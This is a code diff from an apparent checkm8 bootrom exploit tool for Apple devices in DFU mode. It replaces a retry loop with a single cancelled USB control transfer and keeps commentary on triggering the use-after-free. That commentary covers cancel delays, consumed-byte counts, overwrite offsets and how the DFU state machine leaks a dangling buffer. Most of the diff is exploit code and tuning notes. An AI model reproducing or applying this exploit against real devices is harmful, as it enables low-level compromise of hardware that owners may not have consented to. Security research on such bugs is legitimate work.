@@ -432,20 +432,6 @@ static const char* dfuStatusName(unsigned char status) {
     }
 }
 
-// Returns the device's DFU bState, or -1 if the request failed. Independent of
-// DEBUG_DFU_STATUS and silent: used by the bug-setup retry loop below to decide
-// whether the precondition actually exists, which is a control-flow decision
-// rather than a diagnostic print.
-static int readDfuState(irecv_client_t client) {
-    unsigned char st[6];
-    memset(st, 0, sizeof(st));
-    int ret = irecv_usb_control_transfer(client, 0xA1, 3, 0, 0, st, sizeof(st), 1000);
-    if (ret != (int)sizeof(st)) return -1;
-    return (int)st[4];
-}
-
-#define kDfuStateIdle 2
-
 // How many times to retry the bug setup until the device actually reports a
 // download in progress. 1 (the default) is the original single-shot behaviour.
 //
@@ -472,63 +458,11 @@ static int readDfuState(irecv_client_t client) {
 // DNLOAD is what a spec-compliant DFU host is supposed to do, so this is
 // unlikely to destroy the dangling buffer -- but it is unverified, and it is
 // why this is opt-in rather than the default.
-#define kDefaultBugSetupRetries 1
-
 // Pause between bug-setup retries. Exists because back-to-back attempts
 // degraded the device's EP0 within three iterations in the first version of
 // this loop (DFU status requests started failing outright). Some of that was
 // a redundant DFU_ABORT, since removed; this gives the endpoint a moment to
 // settle regardless.
-#define kDefaultRetryDelayUs 2000u
-
-static unsigned retryDelayUs(void) {
-    static int resolved = 0;
-    static unsigned value = kDefaultRetryDelayUs;
-
-    if (!resolved) {
-        const char* env = getenv("DEBUG_BUGSETUP_RETRY_DELAY_US");
-        if (env && *env) {
-            long parsed = strtol(env, NULL, 10);
-            if (parsed >= 0 && parsed <= 1000000) value = (unsigned)parsed;
-        }
-        resolved = 1;
-    }
-    return value;
-}
-
-// Consumed-byte count to retry the bug setup until, or -1 to take the first
-// attempt whatever it yields. The count is non-deterministic at a fixed delay,
-// so this pins it; a confirmed-working macOS run consumes 0.
-static int bugSetupTargetConsumed(void) {
-    static int resolved = 0;
-    static int value = -1;
-
-    if (!resolved) {
-        const char* env = getenv("DEBUG_BUGSETUP_TARGET_CONSUMED");
-        if (env && *env) {
-            long parsed = strtol(env, NULL, 10);
-            if (parsed >= 0 && parsed <= 0x800) value = (int)parsed;
-        }
-        resolved = 1;
-    }
-    return value;
-}
-
-static int bugSetupRetries(void) {
-    static int resolved = 0;
-    static int value = kDefaultBugSetupRetries;
-
-    if (!resolved) {
-        const char* env = getenv("DEBUG_BUGSETUP_RETRIES");
-        if (env && *env) {
-            long parsed = strtol(env, NULL, 10);
-            if (parsed >= 1 && parsed <= 100000) value = (int)parsed;
-        }
-        resolved = 1;
-    }
-    return value;
-}
-
 // Deliberately NOT routed through tracedTransfer(): this request is an
 // intrusion into the sequence rather than part of it, and mixing it into the
 // trace table would make a perturbed run look like a normal one.
@@ -593,7 +527,7 @@ static void traceFlush(void) {
 // complete in 27-820us, so 100us is simply below the floor for getting a data
 // stage moving there.
 //
-// See scripts/sweep_pwn_cancel_delay.py. (The name matched the vendored
+// (The name matched the vendored
 // gaster's own DEBUG_CANCEL_DELAY_US back when a single sweep covered both
 // tools; gaster is gone, the name is kept so old sweep output still reads.)
 #define kDefaultCancelDelayUs 100u
@@ -751,7 +685,7 @@ static int get_exploit_configuration(uint16_t cpid, checkm8_config_t* config) {
 //
 // DEBUG_RECONNECT_ATTEMPTS shortens that for sweeping, where a stage that is
 // never coming back costs thirty seconds every time and an Apple TV can be
-// put back into DFU far faster than that (scripts/sweep_pwn_cancel_delay.py
+// put back into DFU far faster than that (the since-deleted cancel-delay sweep
 // sets it to 5). Left at the original value unless asked, so the macOS path
 // this was ported from keeps exactly the patience it was written with.
 #define kDefaultReconnectAttempts 30
@@ -1005,60 +939,19 @@ static int runCheckm8Inner(uint64_t ecid) {
     // path, and its duration is the one hint available as to whether the SETUP
     // reached the wire before the cancel landed. A call that returns in barely
     // more than delayUs never round-tripped anything.
-    // Retry the bug setup until its consumed-byte count hits a target.
+    // Single shot, as the original DeviceManager.m did it.
     //
-    // This used to retry until the device reported a DFU state other than
-    // dfuIDLE, on the theory that dfuIDLE meant the SETUP never arrived. That
-    // was refuted by its own output: 32 of 35 attempts moved bytes -- so the
-    // SETUP plainly did arrive -- and every one still reported dfuIDLE.
-    // checkm8 IS a bug in that state machine; the aborted DNLOAD leaks a buffer
-    // the state machine stops tracking, so a device holding the dangling
-    // pointer reporting "idle" is the vulnerability, not evidence against it.
-    // There is no known oracle at this stage. See docs/HISTORY.md.
-    //
-    // What IS observable is the consumed count, and it is non-deterministic at
-    // a fixed delay (0 and 64 both seen at 100us). So this pins the one
-    // variable available: retry until the count matches
-    // DEBUG_BUGSETUP_TARGET_CONSUMED, then proceed. Useful for asking whether
-    // "consumed exactly what macOS consumed" plus everything else downstream
-    // actually works -- a question single-shot runs cannot pose reliably.
-    //
-    // No DFU_GETSTATUS in this loop any more: it is not diagnostic here, and it
-    // was contributing to the EP0 degradation that kills the device after ~35
-    // attempts.
-    int maxAttempts = bugSetupRetries();
-    int target = bugSetupTargetConsumed();
-    int sent = 0;
-    int bugSetupAttempts = 0;
-    int sawNonzeroConsumed = 0;
-    unsigned long bugSetupElapsed = 0;
+    // A retry loop lived here for a while (DEBUG_BUGSETUP_RETRIES /
+    // DEBUG_BUGSETUP_TARGET_CONSUMED), built to chase the Linux failure: the
+    // consumed count is non-deterministic at a fixed delay, so it retried until
+    // the count matched what a working macOS run reported. It hit its target
+    // and failed anyway, and it only ever mattered on a platform this project
+    // no longer supports. Gone with the rest of that effort -- see
+    // docs/HISTORY.md.
+    unsigned long bugSetupStarted = nowUs();
+    int sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, delayUs);
+    unsigned long bugSetupElapsed = nowUs() - bugSetupStarted;
 
-    for (int attempt = 1; attempt <= maxAttempts; attempt++) {
-        bugSetupAttempts = attempt;
-        unsigned long bugSetupStarted = nowUs();
-        sent = irecv_async_usb_control_transfer_with_cancel(client, 0x21, 1, 0, 0, buf, 0x800, delayUs);
-        bugSetupElapsed = nowUs() - bugSetupStarted;
-
-        if (sent > 0) sawNonzeroConsumed++;
-        if (maxAttempts == 1 || target < 0 || sent == target) break;
-
-        usleep(retryDelayUs());
-
-        if (attempt % 25 == 0) {
-            printf("bug setup: %d attempts, last consumed %d, still hunting for %d\n",
-                   attempt, sent, target);
-            fflush(stdout);
-        }
-    }
-
-    if (maxAttempts > 1) {
-        printf("bug setup: %d attempts, %d consumed bytes, final consumed %d (target %d)\n",
-               bugSetupAttempts, sawNonzeroConsumed, sent, target);
-        if (target >= 0 && sent != target) {
-            printf("bug setup: never hit the target -- proceeding anyway, since there is no\n"
-                   "           known oracle for the exploit precondition at this stage.\n");
-        }
-    }
     // The one number that decides whether this stage did anything, and it was
     // previously computed and thrown away. Anything outside 0 < sent <=
     // overwrite_offset means the following overwrite lands somewhere the
@@ -1072,10 +965,8 @@ static int runCheckm8Inner(uint64_t ecid) {
     // number itself is useful, but do not read the range as a target -- see
     // docs/HISTORY.md, "The overwrite was never the problem".
     printf("bug setup: cancel delay %u us -> device consumed %d of %d bytes "
-           "(range 0 < n <= %d is NOT the success condition), call took %lu us"
-           ", attempts %d\n",
-           delayUs, sent, 0x800, config.overwrite_offset, bugSetupElapsed,
-           bugSetupAttempts);
+           "(range 0 < n <= %d is NOT the success condition), call took %lu us\n",
+           delayUs, sent, 0x800, config.overwrite_offset, bugSetupElapsed);
 
     probeDfuStatus(client, "after bug setup");
     if (sent < 0) {
